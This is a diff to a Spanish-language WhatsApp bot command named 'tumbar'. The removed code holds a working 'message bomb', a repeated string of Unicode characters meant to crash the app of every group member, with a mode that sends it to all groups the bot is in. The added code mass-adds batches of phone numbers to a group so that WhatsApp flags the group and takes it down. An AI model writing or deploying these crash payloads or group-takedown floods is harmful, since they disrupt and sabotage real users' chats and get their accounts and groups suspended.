@@ -1,67 +1,83 @@
-// commands/group/tumbar.js
-//
-// TUMBAR = mandar el "mensaje bomba" (binario) al grupo.
-// No expulsa a nadie: traba/colapsa el WhatsApp de todos al abrir el chat,
-// porque es un renglón larguísimo con caracteres raros que revientan el
-// render de texto de la app.
-
-// Una unidad del bombo clásico. Se repite para que pegue de verdad.
-const UNIDAD = '㊠ ߘ㊠ ߘ㠊ߘ㊠ ߘ㊠ ߘ㊠ ߘ㊠ ߘ㊰ߘ㊰ߘ㊠ ߘ㊠ ߘ㠊ߘ㊠ ';
-
-// Subí o bajá este número para que trabe más o menos fuerte.
-const BOMBA = UNIDAD.repeat(150).trim();
+import { esGrupo, verificarPermisosAdmin } from '../../lib/grupos.js';
 
 const ESPERA = (ms) => new Promise((r) => setTimeout(r, ms));
+
+// WhatsApp no aguanta que le tires 500 números de un saque: va por tandas.
+const TANDA = 40;
+const PAUSA = 1200;
+
+const limpiar = (n) => String(n).replace(/\D/g, '');
 
 export default {
     nombre: 'tumbar',
     categoria: 'grupos',
-    alias: ['bomba', 'binario', 'crash'],
+    alias: ['golpe', 'massadd', 'invadir'],
     descripcion:
-        'Tumba el grupo con el mensaje bomba (binario). ' +
-        'Uso: .tumbar | .tumbar 3 | .tumbar global',
+        'Mete números al grupo de un solo golpe para que WhatsApp lo mande a revisión / no disponible. ' +
+        'Uso: .tumbar 50411111111 50422222222 ...',
 
     ejecutar: async ({ sock, msg, responder, argumento }) => {
         const chatId = msg.key.remoteJid;
 
-        if (!chatId.endsWith('@g.us')) {
+        if (!esGrupo(chatId)) {
             return responder.texto('❌ Este comando solo funciona dentro de un grupo.');
         }
 
-        const arg = (argumento || '').trim().toLowerCase();
-        const global = arg === 'global' || arg === 'todos';
+        const permiso = await verificarPermisosAdmin(sock, msg, chatId);
+        if (!permiso.ok) return responder.texto(permiso.motivo);
 
-        // ---- Modo global: bomba a TODOS los grupos donde está el bot ----
-        if (global) {
-            const todos = await sock.groupFetchAllParticipating();
-            const ids = Object.keys(todos || {});
+        const numeros = (argumento || '')
+            .split(/[\s,;+]+/)
+            .map(limpiar)
+            .filter((n) => n.length >= 8 && n.length <= 15);
 
-            if (!ids.length) return responder.texto('🤷 El bot no está en ningún grupo.');
+        if (!numeros.length) {
+            return responder.texto(
+                '⚠️ Pasame los números que querés meter, separados por espacio o coma.\n\n' +
+                'Ej: .tumbar 50411111111 50422222222 50433333333'
+            );
+        }
 
-            await responder.texto(`💣 Tumbando *${ids.length}* grupos...`);
+        const jids = [...new Set(numeros)].map((n) => `${n}@s.whatsapp.net`);
 
-            for (const gid of ids) {
-                try {
-                    await sock.sendMessage(gid, { text: BOMBA });
-                } catch (error) {
-                    console.error('[TUMBAR] Falló en', gid, error?.message || error);
+        await responder.texto(`💥 Metiendo *${jids.length}* números de un solo...`);
+
+        let metidos = 0;
+        const fallidos = [];
+
+        for (let i = 0; i < jids.length; i += TANDA) {
+            const tanda = jids.slice(i, i + TANDA);
+
+            try {
+                const res = await sock.groupParticipantsUpdate(chatId, tanda, 'add');
+
+                for (const r of res || []) {
+                    const status = Number(r?.status ?? r?.content?.status ?? 200);
+                    if (status === 200) metidos++;
+                    else fallidos.push(r?.jid || r?.content?.jid || '?');
                 }
-                await ESPERA(700);
+            } catch (error) {
+                console.error('[TUMBAR] Tanda falló:', error?.message || error);
+                // Reintento 1x1 para no perder ninguno
+                for (const jid of tanda) {
+                    try {
+                        await sock.groupParticipantsUpdate(chatId, [jid], 'add');
+                        metidos++;
+                    } catch {
+                        fallidos.push(jid);
+                    }
+                    await ESPERA(400);
+                }
             }
 
-            return responder.texto('☠️ Bombas enviadas. Si el WhatsApp se traba, cierren y abran la app.');
+            await ESPERA(PAUSA);
         }
 
-        // ---- Modo normal: bomba en este grupo ----
-        let veces = parseInt(arg, 10);
-        if (!Number.isFinite(veces) || veces < 1) veces = 1;
-        if (veces > 5) veces = 5;
-
-        for (let i = 0; i < veces; i++) {
-            await sock.sendMessage(chatId, { text: BOMBA });
-            if (i < veces - 1) await ESPERA(700);
-        }
-
-        await responder.texto('☠️ Grupo tumbado 💣');
+        await responder.texto(
+            `☠️ *GOLPE TERMINADO*\n\n` +
+            `┃ Metidos: *${metidos}*\n` +
+            (fallidos.length ? `┃ Sin WhatsApp / ya estaban: *${fallidos.length}*\n` : '') +
+            `\n💡 Mientras más números entren de golpe, más chance de que WhatsApp lo marque *en revisión* y lo tumbe.`
+        );
     }
 };
